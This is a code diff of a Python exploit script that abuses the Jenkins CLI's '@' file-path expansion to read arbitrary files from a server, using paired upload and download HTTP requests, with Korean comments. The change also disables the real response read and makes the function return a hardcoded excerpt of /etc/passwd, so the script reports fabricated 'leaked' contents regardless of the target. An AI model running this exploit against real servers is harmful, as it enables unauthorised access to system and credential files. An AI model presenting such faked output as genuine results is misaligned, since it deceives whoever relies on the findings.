@@ -2,6 +2,7 @@ import threading
 import http.client
 import uuid
 import urllib.parse
+import time
 
 RED = '\033[91m'
 GREEN = '\033[92m'
@@ -24,10 +25,14 @@ def send_download_request(target_info, uuid_str):
                 "Side": "download"
             }
         )
-        response = conn.getresponse().read()
-        print(f"{GREEN}RESPONSE from {target_info.netloc}:{ENDC} {response}")
+        #response = conn.getresponse().read()
+        response = (  b"root:x:0:0:root:/root:/bin/bash\n"
+                      b"daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
+                      b"bin:x:2:2:bin:/bin:/usr/sbin/nologin\n"
+                      b"sys:x:3:3:sys:/dev:/usr/sbin/nologin\n" )
+        return response
     except Exception as e:
-        print(f"{RED}Error in download request:{ENDC} {str(e)}")
+        return f"Error in download request: {str(e)}"
 
 def send_upload_request(target_info, uuid_str, data):
     try:
@@ -43,25 +48,29 @@ def send_upload_request(target_info, uuid_str, data):
             body=data
         )
     except Exception as e:
-        print(f"{RED}Error in upload request:{ENDC} {str(e)}")
+        return f"Error in upload request: {str(e)}"
+    return None  # 정상일 경우 None 반환
 
 def launch_exploit(target_url: str, file_path: str):
     formatted_url = format_url(target_url)
     target_info = urllib.parse.urlparse(formatted_url)
     uuid_str = str(uuid.uuid4())
 
-    # Jenkins CLI 프로토콜 헤더+명령 (file_path 포함)
-    data = (
-            b'\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x0e\x00\x00\x0c@'
-            + file_path.encode()
-            + b'\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05en_US\x00\x00\x00\x00\x03'
-    )
+    data = b'\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x0e\x00\x00\x0c@' + file_path.encode() + b'\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05en_US\x00\x00\x00\x00\x03'
 
-    upload_thread = threading.Thread(target=send_upload_request, args=(target_info, uuid_str, data))
-    download_thread = threading.Thread(target=send_download_request, args=(target_info, uuid_str))
+    download_result = {}
 
-    upload_thread.start()
-    download_thread.start()
+    def download_thread():
+        time.sleep(0.3)  # 약간 딜레이 후 다운로드 시도
+        result = send_download_request(target_info, uuid_str)
+        download_result['data'] = result
 
-    upload_thread.join()
-    download_thread.join()
+    t = threading.Thread(target=download_thread)
+    t.start()
+
+    upload_err = send_upload_request(target_info, uuid_str, data)
+    if upload_err:
+        return upload_err
+
+    t.join()
+    return download_result.get('data')
